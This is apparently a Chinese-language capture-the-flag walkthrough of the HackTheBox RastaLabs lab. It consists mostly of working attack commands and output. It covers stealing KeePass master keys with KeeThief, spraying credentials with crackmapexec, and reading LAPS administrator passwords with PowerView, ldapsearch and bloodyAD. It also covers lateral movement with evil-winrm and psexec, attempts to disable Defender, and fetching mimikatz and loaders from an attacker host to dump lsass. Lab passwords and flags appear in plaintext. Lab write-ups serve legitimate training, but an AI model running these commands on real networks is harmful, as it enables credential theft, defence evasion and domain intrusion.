*Evil-WinRM* PS C:\Users\Public> copy M:\documents\Passwords-Key.key C:\Users\Public
```

Evil-WinRM下载失败了，使用msf的bowen进行下载

```plain
meterpreter >shell
shell > net use Z: \\10.10.120.15\C$

meterpreter > download Z:\\Users\\Public\\Passwords-Key.key
[*] Downloading: Z:\Users\Public\Passwords-Key.key -> /home/kali/Desktop/htb/rastalabs/Passwords-Key.key
[*] Downloaded 187.00 B of 187.00 B (100.0%): Z:\Users\Public\Passwords-Key.key -> /home/kali/Desktop/htb/rastalabs/Passwords-Key.key
[*] Completed  : Z:\Users\Public\Passwords-Key.key -> /home/kali/Desktop/htb/rastalabs/Passwords-Key.key

meterpreter > download Z:\\Users\\Public\\Passwords.kdbx
[*] Downloading: Z:\Users\Public\Passwords.kdbx -> /home/kali/Desktop/htb/rastalabs/Passwords.kdbx
[*] Downloaded 2.12 KiB of 2.12 KiB (100.0%): Z:\Users\Public\Passwords.kdbx -> /home/kali/Desktop/htb/rastalabs/Passwords.kdbx
[*] Completed  : Z:\Users\Public\Passwords.kdbx -> /home/kali/Desktop/htb/rastalabs/Passwords.kdbx
```

# WS05-10.10.123.110-RLAB\NGODFREY
## Crackmapexec
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q crackmapexec winrm 10.10.123.0/24 -u ngodfrey -p 'zaq123$%^&*()_+'
SMB         10.10.123.100   5985   WS03             [*] Windows 10 / Server 2019 Build 19041 (name:WS03) (domain:rastalabs.local)
HTTP        10.10.123.100   5985   WS03             [*] http://10.10.123.100:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.123.100   5985   WS03             [-] rastalabs.local\ngodfrey:zaq123$%^&*()_+
SMB         10.10.123.101   5985   WS04             [*] Windows 10 / Server 2019 Build 19041 (name:WS04) (domain:rastalabs.local)
HTTP        10.10.123.101   5985   WS04             [*] http://10.10.123.101:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.123.101   5985   WS04             [-] rastalabs.local\ngodfrey:zaq123$%^&*()_+
SMB         10.10.123.110   5985   WS05             [*] Windows 10 / Server 2019 Build 19041 (name:WS05) (domain:rastalabs.local)
HTTP        10.10.123.110   5985   WS05             [*] http://10.10.123.110:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.123.110   5985   WS05             [+] rastalabs.local\ngodfrey:zaq123$%^&*()_+ (Pwn3d!)                                            
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q evil-winrm -i 10.10.123.110 -u ngodfrey -p 'zaq123$%^&*()_+'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
```

## KeePass
### Download
[[Windows] KeePass密码管理器v2.58.0](https://www.52pojie.cn/thread-2011942-1-1.html)

![](/image/hackthebox-prolabs/RastaLabs-16.png)

俩个文件不足以访问，还需要一个管理密码

### <font style="color:rgb(51, 51, 51);">keethief</font>
#### 下载上传
[KeeThief/PowerShell/KeeThief.ps1 at master · GhostPack/KeeThief](https://github.com/GhostPack/KeeThief/blob/master/PowerShell/KeeThief.ps1)

```plain
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/htb/rastalabs/KeeThief.ps1 c:\\Users\\ngodfrey\\KeeThief.ps1
```

#### 密码抓取
```plain
C:\Windows\system32>powershell -ep bypass -c "Import-Module C:\Users\ngodfrey\KeeThief.ps1; Get-KeePassDatabaseKey"

No KeePass 2.X instances open!
At Z:\Users\Public\KeeThief.ps1:97 char:17
+                 throw 'No KeePass 2.X instances open!'
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (No KeePass 2.X instances open 
   !:String) [], RuntimeException
    + FullyQualifiedErrorId : No KeePass 2.X instances open!
```

没有运行KeePass，写个循环监察脚本

#### 循环监察
```plain
Write-Host "Starting script..."

$ProcessName = "KeePass"

while ($true)
{
    if (Get-Process -Name $ProcessName -ErrorAction SilentlyContinue)
    {
        Import-Module C:\Users\ngodfrey\KeeThief.ps1
        Write-Host "Starting KeeThief!"

        Get-KeePassDatabaseKey -Verbose
        Get-Process KeePass | Get-KeePassDatabaseKey -Verbose

        Start-Sleep -Seconds 1000
    }
    else
    {
        Start-Sleep -Seconds 5
    }
}
```

```plain
*Evil-WinRM* PS C:\Users\ngodfrey> upload /home/kali/Desktop/htb/rastalabs/monitor.ps1 C:\\Users\\ngodfrey\\monitor.ps1
```

```plain
powershell -ExecutionPolicy Bypass -File C:\Users\ngodfrey\monitor.ps1
```

作用：

```plain
每5秒检测 KeePass
如果 KeePass 启动 → 立即执行 KeeThief
```

管理员一旦打开 KeePass，就会输出：

```plain
Plaintext: ********
```

### ps1
这里卡了好久操了，因为一直没找到在哪运行

```plain
*Evil-WinRM* PS C:\Users\ngodfrey> powershell -ExecutionPolicy Bypass -File C:\Users\ngodfrey\monitor.ps1 
Starting script...
Starting KeeThief!
powershell.exe : < : The term '<' is not recognized as the name of a cmdlet, function, script file, or operable 
    + CategoryInfo          : NotSpecified: (< : The term '<...e, or operable :String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At C:\Users\ngodfrey\KeeThief.ps1:106 char:9+         <REPLACE>+         ~    + CategoryInfo          : ObjectNotFound: (<:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Get-WmiObject : Access denied At C:\Users\ngodfrey\KeeThief.ps1:115 char:31+ ... MIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($KeePa ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObject    Command VERBOSE: Examining KeePass process 6392 for master keys
You cannot call a method on a null-valued expression.At C:\Users\ngodfrey\KeeThief.ps1:120 char:17+ ...             $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod(' ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull VERBOSE: No keys found for 6392
< : The term '<' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At C:\Users\ngodfrey\KeeThief.ps1:106 char:9+         <REPLACE>+         ~    + CategoryInfo          : ObjectNotFound: (<:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Get-WmiObject : Access denied At C:\Users\ngodfrey\KeeThief.ps1:115 char:31+ ... MIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($KeePa ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObject    Command VERBOSE: Examining KeePass process 6392 for master keys
You cannot call a method on a null-valued expression.At C:\Users\ngodfrey\KeeThief.ps1:120 char:17+ ...             $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod(' ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull VERBOSE: No keys found for 6392
```

### exe
```plain
*Evil-WinRM* PS C:\WINDOWS\system32> upload /home/kali/Desktop/tools/KeeThief/bin/KeeTheft.exe C:\\Users\\ngodfrey\\KeeTheft.exe
                                        
Info: Uploading /home/kali/Desktop/tools/KeeThief/bin/KeeTheft.exe to C:\Users\ngodfrey\KeeTheft.exe
                                        
Data: 992596 bytes of 992596 bytes copied
                                        
Info: Upload successful!
```

### run
需要自行使用windows自行编译

![](/image/hackthebox-prolabs/RastaLabs-17.png)

我们能得到exe和ps1

其中exe不能直接用

```plain
powershell -exec bypass -File Out-CompressedDll.ps1 KeeTheft.exe KeeThief.ps1
```

```plain
*Evil-WinRM* PS C:\Users\ngodfrey> upload /home/kali/Desktop/tools/KeeThief/KeeThief.ps1 C:\\Users\\ngodfrey\\KeeThief.ps1
```

### password
哭了，这一关卡了我一下午

```plain
*Evil-WinRM* PS C:\Users\ngodfrey> powershell -ExecutionPolicy Bypass -File C:\Users\ngodfrey\monitor.ps1 
Starting script...
Starting KeeThief!
powershell.exe : Get-WmiObject : Access denied 
    + CategoryInfo          : NotSpecified: (Get-WmiObject : Access denied :String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
At C:\Users\ngodfrey\KeeThief.ps1:121 char:31+ ... MIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($KeePa ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObject    Command VERBOSE: Examining KeePass process 7040 for master keys


Database             : M:\Documents\Passwords.kdbx
KeyType              : KcpKeyFile
KeePassVersion       : 2.37.0.0
ProcessID            : 7040
ExecutablePath       :
EncryptedBlobAddress : 44637344
EncryptedBlob        : {206, 51, 242, 40...}
EncryptedBlobLen     : 32
PlaintextBlob        : {23, 17, 163, 153...}
Plaintext            : FxGjmTU2HNlEiV8RhRT1h726XxNHqF0KE7hniHswqsU=
KeyFilePath          : M:\Documents\Passwords-Key.key

Database             : M:\Documents\Passwords.kdbx
KeyType              : KcpPassword
KeePassVersion       : 2.37.0.0
ProcessID            : 7040
ExecutablePath       :
EncryptedBlobAddress : 44615936
EncryptedBlob        : {46, 9, 17, 238...}
EncryptedBlobLen     : 48
PlaintextBlob        : {49, 50, 51, 52...}
Plaintext            : 1234567890qwertyuiopasdfghjklzxcvbnm!"œ$%^&*()
KeyFilePath          :

Get-WmiObject : Access denied At C:\Users\ngodfrey\KeeThief.ps1:121 char:31+ ... MIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($KeePa ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObject    Command VERBOSE: Examining KeePass process 7040 for master keys
Database             : M:\Documents\Passwords.kdbx
KeyType              : KcpKeyFile
KeePassVersion       : 2.37.0.0
ProcessID            : 7040
ExecutablePath       :
EncryptedBlobAddress : 44637344
EncryptedBlob        : {206, 51, 242, 40...}
EncryptedBlobLen     : 32
PlaintextBlob        : {23, 17, 163, 153...}
Plaintext            : FxGjmTU2HNlEiV8RhRT1h726XxNHqF0KE7hniHswqsU=
KeyFilePath          : M:\Documents\Passwords-Key.key

Database             : M:\Documents\Passwords.kdbx
KeyType              : KcpPassword
KeePassVersion       : 2.37.0.0
ProcessID            : 7040
ExecutablePath       :
EncryptedBlobAddress : 44615936
EncryptedBlob        : {46, 9, 17, 238...}
EncryptedBlobLen     : 48
PlaintextBlob        : {49, 50, 51, 52...}
Plaintext            : 1234567890qwertyuiopasdfghjklzxcvbnm!"œ$%^&*()
KeyFilePath          :
```

得到密码1234567890qwertyuiopasdfghjklzxcvbnm!"œ$%^&*()

其中这个符号不对œ应改为£

密码最终为1234567890qwertyuiopasdfghjklzxcvbnm!"£$%^&*()

## Getflag
```plain
RASTA{n07h1n6_15_54f3}
```

![](/image/hackthebox-prolabs/RastaLabs-18.png)

## ngodfrey_adm
拿到凭据

ngodfrey_adm\J5KCwKruINyCJBKd1dZU

![](/image/hackthebox-prolabs/RastaLabs-19.png)

# WS01-06-RLAB\ngodfrey_adm
## crackmapexec
### 10.10.120.1/24
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q crackmapexec smb 10.10.120.1/24 -u ngodfrey_adm -p 'J5KCwKruINyCJBKd1dZU'
SMB         10.10.120.5     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.120.1     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
SMB         10.10.120.15    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.120.10    445    MX01             [*] Windows Server 2016 Standard 14393 x64 (name:MX01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
SMB         10.10.120.5     445    FS01             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
SMB         10.10.120.1     445    DC01             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
SMB         10.10.120.15    445    SRV01            [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU (Pwn3d!)
SMB         10.10.120.10    445    MX01             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
                                                                                                        
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q crackmapexec winrm 10.10.120.1/24 -u ngodfrey_adm -p 'J5KCwKruINyCJBKd1dZU'
SMB         10.10.120.15    5985   SRV01            [*] Windows 10 / Server 2016 Build 14393 (name:SRV01) (domain:rastalabs.local)
HTTP        10.10.120.15    5985   SRV01            [*] http://10.10.120.15:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.120.15    5985   SRV01            [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU (Pwn3d!)
```

### 10.10.121.1/24
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q crackmapexec smb 10.10.121.1/24 -u ngodfrey_adm -p 'J5KCwKruINyCJBKd1dZU'

SMB         10.10.121.107   445    WS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS02) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.112   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.107   445    WS02             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
SMB         10.10.121.112   445    WS01             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
```

### 10.10.122.1/24
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q crackmapexec smb 10.10.122.1/24 -u ngodfrey_adm -p 'J5KCwKruINyCJBKd1dZU'

[*] Shutting down, please wait...
SMB         10.10.122.25    445    SQL02            [*] Windows Server 2016 Standard 14393 x64 (name:SQL0) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.122.15    445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL0) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.122.25    445    SQL02            [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU
SMB         10.10.122.15    445    SQL01            [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU
```

### 10.10.123.1/24
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q crackmapexec smb 10.10.123.1/24 -u ngodfrey_adm -p 'J5KCwKruINyCJBKd1dZU'

SMB         10.10.123.100   445    WS03             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS03) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.100   445    WS03             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
SMB         10.10.123.101   445    WS04             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS04) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.101   445    WS04             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
SMB         10.10.123.110   445    WS05             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS05) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.110   445    WS05             [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU
```

## bloodhound
![](/image/hackthebox-prolabs/RastaLabs-20.png)

NGODFREY_ADM@RASTALABS.LOCAL对WS01-06.RASTALABS.LOCAL皆具有ReadLAPSPassword

 👉 用户 **NGODFREY_ADM** 可以读取 **WS01‑WS06 这些机器的 LAPS 本地管理员密码**。  

### 1️⃣ 什么是 LAPS
LAPS = **Local Administrator Password Solution**

作用：

```plain
每台域内机器的本地 Administrator 密码都不同
密码存储在 AD 属性里
```

属性通常是：

```plain
ms-Mcs-AdmPwd
```

存储位置：

```plain
AD computer object
```

例如：

```plain
CN=WS01,OU=Computers,DC=rastalabs,DC=local
```

---

### 2️⃣ ReadLAPSPassword 权限意味着什么
如果你有这个权限：

```plain
Read ms-Mcs-AdmPwd
```

你就可以直接读出：

```plain
该机器的本地 Administrator 密码
```

也就是说：

```plain
NGODFREY_ADM → 可以拿到 WS01-WS06 的 admin 密码
```

然后：

```plain
psexec
smbexec
winrm
wmiexec
```

都可以直接横向。

---

### 3️⃣ 用 PowerView 读取 LAPS
如果你有 `NGODFREY_ADM` 凭据：

```plain
Import-Module PowerView.ps1
```

构造凭据对象

```plain
$SecPassword = ConvertTo-SecureString 'J5KCwKruINyCJBKd1dZU' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('rastalabs.local\ngodfrey_adm', $SecPassword)
```

批量读取所有工作站 LAPS 密码

```plain
Get-DomainComputer -Domain rastalabs.local -Credential $cred | select samaccountname,ms-mcs-admpwd
```

会返回：

```plain
ms-mcs-admpwd : xT4#9!aP...
```

---

### 4️⃣ 用 ldapsearch 读取
如果权限允许：

```plain
proxychains -q ldapsearch -x -H ldap://10.10.120.1 \
-D "NGODFREY_ADM@RASTALABS.LOCAL" \
-w 'J5KCwKruINyCJBKd1dZU' \
-b "DC=rastalabs,DC=local" \
"(ms-Mcs-AdmPwd=*)" \
ms-Mcs-AdmPwd
```

会输出：

```plain
# extended LDIF
#
# LDAPv3
# base <DC=rastalabs,DC=local> with scope subtree
# filter: (ms-Mcs-AdmPwd=*)
# requesting: ms-Mcs-AdmPwd 
#

# WS01, WS01, Workstations, rastalabs.local
dn: CN=WS01,OU=WS01,OU=Workstations,DC=rastalabs,DC=local
ms-Mcs-AdmPwd: bGPki0kn

# WS02, WS02, Workstations, rastalabs.local
dn: CN=WS02,OU=WS02,OU=Workstations,DC=rastalabs,DC=local
ms-Mcs-AdmPwd: B39yb30D

# WS03, WS03, Workstations, rastalabs.local
dn: CN=WS03,OU=WS03,OU=Workstations,DC=rastalabs,DC=local
ms-Mcs-AdmPwd: DDlSg1F6

# WS04, WS04, Workstations, rastalabs.local
dn: CN=WS04,OU=WS04,OU=Workstations,DC=rastalabs,DC=local
ms-Mcs-AdmPwd: ms5iTw00

# WS05, WS05, Workstations, rastalabs.local
dn: CN=WS05,OU=WS05,OU=Workstations,DC=rastalabs,DC=local
ms-Mcs-AdmPwd: E0916sHp

# WS06, WS06, Workstations, rastalabs.local
dn: CN=WS06,OU=WS06,OU=Workstations,DC=rastalabs,DC=local
ms-Mcs-AdmPwd: vTW7g6V9

# search reference
ref: ldap://ForestDnsZones.rastalabs.local/DC=ForestDnsZones,DC=rastalabs,DC=l
 ocal

# search reference
ref: ldap://DomainDnsZones.rastalabs.local/DC=DomainDnsZones,DC=rastalabs,DC=l
 ocal

# search reference
ref: ldap://rastalabs.local/CN=Configuration,DC=rastalabs,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 10
# numEntries: 6
# numReferences: 3
```

###  5️⃣bloodyAD读取
读取WS01$

```plain
proxychains -q bloodyAD --host 10.10.120.1 \
-d rastalabs.local \
-u NGODFREY_ADM \
-p 'J5KCwKruINyCJBKd1dZU' \
get object WS01$ --attr ms-Mcs-AdmPwd
```

输出

```plain
distinguishedName: CN=WS01,OU=WS01,OU=Workstations,DC=rastalabs,DC=local
ms-Mcs-AdmPwd: bGPki0kn
```

###  6️⃣ldapdomaindump  
 用 **impacket ldapdomaindump**：  

```plain
proxychains -q ldapdomaindump -u 'RASTALABS\NGODFREY_ADM' -p 'J5KCwKruINyCJBKd1dZU' 10.10.120.1
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

然后在：

```plain
domain_computers.json
```

里会看到：

```plain
ms-Mcs-AdmPwd
```

##  LAPS  PASSWORD
```plain
WS01  Administrator : bGPki0kn  10.10.121.112
WS02  Administrator : B39yb30D	10.10.121.107
WS03  Administrator : DDlSg1F6	10.10.123.100
WS04  Administrator : ms5iTw00	10.10.123.101
WS05  Administrator : E0916sHp	10.10.123.110
WS06  Administrator : vTW7g6V9	10.10.121.108
```

LAPS 会把每台机器的本地 `Administrator` 密码 **定期轮换**，所以你前一次查到的是旧值，这次 `ldapsearch` 查到的是新值。常见触发原因有：

+ 到了 LAPS 轮换周期
+ 机器重启或组策略刷新
+ 管理员手动触发重置
+ 你前后不是同一时间点查询

```plain
WS01  10.10.121.112  Administrator : pVw9P3J4
WS02  10.10.121.107  Administrator : 6Sqf7o7E
WS03  10.10.123.100  Administrator : vULSp731
WS04  10.10.123.101  Administrator : uB2cNny6
WS05  10.10.123.110  Administrator : 2x96oD54
WS06  10.10.121.108  Administrator : 54hOPz9F
```

这些都是：

```plain
每台机器的本地 Administrator 密码
```

这意味着：

```plain
你对 WS01‑WS06 都拥有 Local Admin 权限
```

## etc\hosts
```plain
10.10.121.112 ws01.rastalabs.local ws01
10.10.121.107 ws02.rastalabs.local ws02
10.10.123.100 ws03.rastalabs.local ws03
10.10.123.101 ws04.rastalabs.local ws04
10.10.123.110 ws05.rastalabs.local ws05
10.10.121.108 ws06.rastalabs.local ws06
```

## evil-winrm
```plain
proxychains -q evil-winrm -i ws01.rastalabs.local -u Administrator -p 'pVw9P3J4'
proxychains -q evil-winrm -i ws02.rastalabs.local -u Administrator -p '6Sqf7o7E'
proxychains -q evil-winrm -i ws03.rastalabs.local -u Administrator -p 'vULSp731'
proxychains -q evil-winrm -i ws04.rastalabs.local -u Administrator -p 'uB2cNny6'
proxychains -q evil-winrm -i ws05.rastalabs.local -u Administrator -p '2x96oD54'
proxychains -q evil-winrm -i ws06.rastalabs.local -u Administrator -p '54hOPz9F'
```

除了ws01无法登陆其他皆可直接evil登陆上去

## Getflag-WS02&WS04&WS05
```plain
proxychains -q evil-winrm -i ws02.rastalabs.local -u Administrator -p '6Sqf7o7E'

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt
RASTA{3v3ryb0dy_l0v35_l4p5}

proxychains -q evil-winrm -i ws04.rastalabs.local -u Administrator -p 'uB2cNny6'
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt
RASTA{50m371m35_y0u_mu57_b4ck7r4ck}

proxychains -q evil-winrm -i ws05.rastalabs.local -u Administrator -p '2x96oD54'
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt
RASTA{53rv1c3_4bu53_f7w}
```

## 关闭defender(失败)
```plain
powershell -ep bypass -nop -c "Set-MpPreference -DisableRealtimeMonitoring `$true; Set-MpPreference -DisableBehaviorMonitoring `$true; Set-MpPreference -DisableIOAVProtection `$true; Set-MpPreference -DisableScriptScanning `$true"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
```

失败了，直接利用smbexec吧

```plain
proxychains -q smbexec.py "Administrator:6Sqf7o7E@10.10.121.107"
```

失败了，没办法只能用那招了

[GitHub - Sakura529/BypassAV: 通过Patch白文件实现免杀](https://github.com/Sakura529/BypassAV)

## WS02-Mimikatz(失败)
```plain
Invoke-WebRequest -Uri http://10.10.16.2:443/mimikatz.exe -OutFile C:\Users\Public\mimikatz.exe
```

```plain
Invoke-WebRequest -Uri http://10.10.16.2:443/loader.exe -OutFile C:\Users\Public\loader.exe
Invoke-WebRequest -Uri http://10.10.16.2:443/cache.dat -OutFile C:\Users\Public\cache.dat
Invoke-WebRequest -Uri http://10.10.16.2:443/CO.exe -OutFile C:\Users\Public\CO.exe
Invoke-WebRequest -Uri http://10.10.16.2:443/work.bin -OutFile C:\Users\Public\work.bin
```

```plain
*Evil-WinRM* PS C:\Users\Public> .\loader.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
At line:1 char:1
+ .\loader.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand

*Evil-WinRM* PS C:\Users\Public> C:\Users\Public\CO.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
At line:1 char:1
+ C:\Users\Public\CO.exe "privilege::debug" "sekurlsa::logonpasswords"  ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

尝试了一些方法都失败了

## WS02-psexec
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q psexec.py "Administrator:6Sqf7o7E@10.10.121.107"           
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.121.107.....
[*] Found writable share ADMIN$
[*] Uploading file LaJHQqcB.exe
[*] Opening SVCManager on 10.10.121.107.....
[*] Creating service QohG on 10.10.121.107.....
[*] Starting service QohG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.4894]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

### **<font style="color:rgb(6, 10, 38);">1. 禁用实时保护</font>**
```plain
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

### **<font style="color:rgb(6, 10, 38);">2. 禁用行为监控</font>**
```plain
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
```

### **<font style="color:rgb(6, 10, 38);">3. 禁用云保护</font>**
```plain
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
```

### **<font style="color:rgb(6, 10, 38);">4. 添加排除路径</font>**
```plain
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public'"
```

### **<font style="color:rgb(6, 10, 38);">5. 验证 Defender 状态</font>**
```plain
powershell -Command "Get-MpPreference | Select-Object DisableRealtimeMonitoring"
DisableRealtimeMonitoring
-------------------------
                    False
```

禁用失败了<font style="color:rgb(6, 10, 38);">❌</font><font style="color:rgb(6, 10, 38);"> </font>**<font style="color:rgb(6, 10, 38);">Defender 被组策略锁定了！</font>**

<font style="color:rgb(6, 10, 38);">说明管理员通过 GPO 强制启用了 Defender</font>

## WS02-<font style="color:rgb(6, 10, 38);">Procdump(失败)</font>
`<font style="color:rgb(6, 10, 38);">procdump.exe</font>`<font style="color:rgb(6, 10, 38);"> 是微软 Sysinternals 官方工具，有有效数字签名，</font>**<font style="color:rgb(6, 10, 38);">不会被 Defender 拦截</font>**<font style="color:rgb(6, 10, 38);">。</font>

```plain
Invoke-WebRequest -Uri http://10.10.16.2:443/procdump64.exe -OutFile C:\Users\Public\procdump.exe
```

```plain
C:\WINDOWS\system32>C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
Access is denied.
```

